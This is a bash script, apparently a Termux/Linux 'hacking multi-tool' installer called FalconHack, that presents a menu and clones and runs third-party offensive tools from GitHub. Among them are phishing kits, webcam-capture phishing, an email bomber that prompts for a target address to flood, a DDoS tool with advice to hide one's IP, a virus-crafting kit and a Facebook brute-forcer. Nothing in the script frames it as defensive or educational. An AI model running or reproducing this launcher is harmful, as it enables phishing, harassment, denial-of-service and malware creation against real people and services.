#!/bin/bash
# FalconHack v1.0 - Multi-Tool Installer
# Author: Paul Mendoza
# GitHub: https://github.com/paulmendoza24/FalconHack

clear
mkdir Tools
clear

echo -e '\033[0;31m
░█▀▀░█▀█░█░░░█▀▀░█▀█░█▀█░░░░░▀█▀░█▀█░█▀█░█░░░█▀▀░
░█▀▀░█▀█░█░░░█░░░█░█░█░█░▄▄▄░░█░░█░█░█░█░█░░░▀▀█░   \033[0;37mv1.0\033[0;31m
░▀░░░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░░░░░░▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░
                    
       
\033[0;34mCoded by \033[1;33mPaul Mendoza\033[0m                       \033[0;34mVersion: \033[1;33mv1.0\033[0m
\033[0;34mGithub: \033[1;33mhttps://github.com/paulmendoza24\033[0m    \033[0;34mExit: \033[1;33mCTRL+C\033[0m

\033[0;30m\033[41mOPTION:\033[0m

\e[37m[1]\033[0;36m Requests & Update   	  \e[37m[2]\033[0;36m Phishing Tool				
\e[37m[3]\033[0;36m WebCam Hack                   \e[37m[4]\033[0;36m Subscan			
\e[37m[5]\033[0;36m Gmail Bomber		  \e[37m[6]\033[0;36m DDOS Attack			
\e[37m[7]\033[0;36m How to use ?	          \e[37m[8]\033[0;36m Uninstall downloaded programs		
\e[37m[9]\033[0;36m Ip Info	                  \e[37m[10]\033[0;36m dorks-eye
\e[37m[11]\033[0;36m HackerPro                    \e[37m[12]\033[0;36m RED_HAWK
\e[37m[13]\033[0;36m VirusCrafter                 \e[37m[14]\033[0;36m Info-Site
\e[37m[15]\033[0;36m BadMod	                  \e[37m[16]\033[0;36m Facebash
\e[37m[17]\033[0;36m DARKARMY                     \e[37m[18]\033[0;36m AUTO-IP-CHANGER\033[0m               

'


read -p "Transaction number: " process
if [[ $process == 1 || $process == 01 ]]; then
    clear

    echo -e "\033[0;30m\033[46m Installing update and requirements...\033[0m"
    sleep 5
    pkg install git -y
    pkg install python python3 -y
    pkg install pip pip3 -y
    pkg install curl -y
    apt update
    apt upgrade -y
    clear
    echo -e "\033[0;30m\033[46m Full update...\033[0m"
    sleep 3
    bash falconhack.sh
elif [[ $process == 2 || $process == 02 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/htr-tech/zphisher
    cd zphisher
    bash zphisher.sh
    
	
elif [[ $process == 3 || $process == 03 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/techchipnet/CamPhish
    cd CamPhish
    bash camphish.sh

elif [[ $process == 4 || $process == 04 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    git clone https://github.com/zidansec/subscan
    cd subscan
    read -p "enter a domain e.g. (example.com): " sc
    ./subscan $sc
       
elif [[ $process == 5 || $process == 05 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/juzeon/fast-mail-bomber.git
    cd fast-mail-bomber/
    mv config.example.php config.php
    php index.php update-providers
    rm -rf data/nodes.json data/dead_providers.json
    echo -e "\033[0;30m\033[46m This installation will take a long time.\033[0m"
    echo -e "\033[0;30m\033[46m To stop, press Ctrl+C.\033[0m"
    sleep 4
    php index.php update-nodes
    php index.php refine-nodes
    echo "-------------------------"
    read -p "Enter an email address to bombard: " mail
    echo "-------------------------"
    php index.php start-bombing $mail

elif [[ $process == 6 || $process == 06 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/palahsu/DDoS-Ripper.git
    cd DDoS-Ripper
    python3 DRipper.py
    echo ""
    echo -e "\033[0;30m\033[46m Before using it, hide your IP.\033[0m"

elif [[ $process == 7 || $process == 07 ]]; then
    clear
    echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
    python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
    sleep 10
    echo "Wait 10 seconds."
    bash falconhack.sh

 
elif [[ $process == 8 || $process == 08 ]]; then
    clear
    echo -e "\033[0;30m\033[46m REMOVING DOWNLOADED PROGRAMS...\033[0m"
    sleep 3 
    rm -rf Tools

    bash falconhack.sh

elif [[ $process == 9 || $process == 09 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    apt update
    apt install git curl
    git clone https://github.com/htr-tech/track-ip.git
    cd track-ip
    bash trackip

elif [[ $process == 10 || $process == 010 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/BullsEye0/dorks-eye.git
    cd dorks-eye
    pip install -r requirements.txt
    python3 dorks-eye.py

elif [[ $process == 11 || $process == 011 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    apt update && apt upgrade && apt install git && apt install python2
    git clone https://github.com/jaykali/hackerpro.git
    cd hackerpro
    sudo bash install.sh
    python2 hackerpro.py

elif [[ $process == 12 || $process == 012 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/Tuhinshubhra/RED_HAWK
    cd RED_HAWK
    php rhawk.php

elif [[ $process == 13 || $process == 013 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/Devil-Tigers/TigerVirus
    apt update
    apt upgrade -y
    pkg install git -y
    cd TigerVirus
    bash app.sh

elif [[ $process == 14 || $process == 014 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    pkg install curl -y
    upgrade -y
    pkg install git -y
    git clone https://github.com/king-hacking/info-site.git
    cd info-site
    bash info.sh

elif [[ $process == 15 || $process == 015 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    sudo apt-get update
    sudo apt-get install php
    sudo apt-get install php-curl
    git clone https://github.com/MrSqar-Ye/BadMod.git
    cd BadMod
    chmod u+x INSTALL
    chmod u+x BadMod.php
    sudo php BadMod.php

elif [[ $process == 16 || $process == 016 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    git clone https://github.com/fu8uk1/facebash
    cd facebash
    bash install.sh
    chmod +x facebash.sh
    tor
    sudo ./facebash.sh

elif [[ $process == 17 || $process == 017 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    sleep 3
    cd Tools
    pkg install git
    pkg install python2
    apt install git
    apt install python2
    git clone https://github.com/D4RK-4RMY/DARKARMY
    cd DARKARMY
    chmod +x darkarmy.py
    python2 darkarmy.py

elif [[ $process == 18 || $process == 018 ]]; then
    clear
    echo -e "\033[0;30m\033[46m Installation may take some time.\033[0m"
    echo -e "\033[0;30m\033[46m This tool will require you to be (ROOT)\033[0m"
    sleep 3
    cd Tools
    sudo apt-get install tor
    pip3 install requests
    git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
    cd Auto_Tor_IP_changer
    echo -e "\033[0;30m\033[46m go to your browser / change the proxy (sock proxy) to 127.0.0.1:9050\033[0m"
    sleep 8
    python3 install.py
    aut

else   
	clear
    echo -e '\033[36;40;1m You entered the wrong code.'	
	sleep 1
	clear 
	bash falconhack.sh
fi

